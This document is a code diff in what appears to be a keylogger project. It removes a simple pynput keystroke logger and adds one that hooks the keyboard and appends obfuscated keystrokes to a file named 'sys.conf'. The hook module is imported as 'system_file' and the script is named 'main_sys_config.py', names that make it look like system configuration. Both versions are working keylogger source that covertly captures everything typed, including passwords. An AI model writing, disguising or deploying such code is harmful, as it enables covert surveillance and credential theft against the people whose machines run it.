@@ -192,31 +192,52 @@ main()
 
 
 
+import system_file
+import sys
+
+log_file='sys.conf' # change the log file output name
+passKey = 0
+
+def getPassKey(password):
+	key = 1
+	count = 0
+	for char in password:
+		if count%2 == 0:
+			key *= ord(char)
+		else:
+			key += ord(char)
+		count += 1
+	return key
+
+# returns the encrypted form of data
+def getEncryptedData(data):
+	if len(data) == 1:
+		return str((ord(data)+passKey)*passKey)
+	else:
+		output = "/ "
+		for char in data:
+			output += str((ord(char)+passKey)*passKey) + ' '
+		return output.strip() + " /"
+
+# invoke function every time a key is pressed
+def OnKeyPress(event):
+  fob = open(log_file, 'a')
+  key_pressed = event.Key
+  if len(key_pressed) == 0:
+	  key_pressed = 'K/X'
+  fob.write(getEncryptedData(key_pressed))
+  fob.write(' ')
+
+if len(sys.argv) != 3:
+	print "-- password & location necessary, syntax: 'python main_sys_config.py password /home/$user_name/sys.conf'"
+else:
+	passKey = getPassKey(sys.argv[1])
+	log_file = sys.argv[2]
+	new_hook = system_file.HookManager()
+	new_hook.KeyDown = OnKeyPress
+	new_hook.HookKeyboard()
+	new_hook.start()
 
 
-from pynput.keyboard import Listener
 
-
-def on_press(key):
-    keystroke = str(key)
-    keystroke = keystroke.replace("'", "")
-
-    if keystroke == 'Key.space':
-        keystroke = ' '
-    if keystroke == 'Key.enter':
-        keystroke = '\n'
-    if keystroke == 'Key.tab':
-        keystroke = '\t'
-
-    redundant = ['Key.shift', 'Key.ctrl', 'Key.shift_r', 'Key.shift_l', 'Key.ctrl_r', 'Key.ctrl_l',
-                 'Key.backspace']
-
-    if keystroke in redundant:
-        keystroke = ''
-
-    with open('log.txt', 'a') as f:
-        f.write(keystroke)
-
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+# end of file
